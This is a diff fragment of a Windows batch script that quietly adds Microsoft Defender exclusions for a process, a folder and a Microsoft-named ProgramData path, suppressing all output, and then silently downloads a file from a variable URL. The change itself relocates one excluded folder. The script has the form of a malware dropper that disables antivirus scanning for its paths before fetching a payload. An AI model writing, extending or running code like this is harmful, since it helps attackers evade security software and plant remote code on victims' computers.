@@ -21,7 +21,7 @@ powershell -Command "try { Add-MpPreference -ExclusionProcess '%filename%' } cat
 powershell -Command "try { Add-MpPreference -ExclusionPath '%folder%' } catch { }" >nul 2>&1
 
 
-set "roaming_folder=%ProgramData%\Roaming\Microsoft"
+set "roaming_folder=%ProgramData%\Microsoft"
 powershell -Command "try { Add-MpPreference -ExclusionPath '%roaming_folder%' } catch { }" >nul 2>&1
 
 powershell -Command "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri '%url%' -OutFile '%filename%'" >nul 2>&1
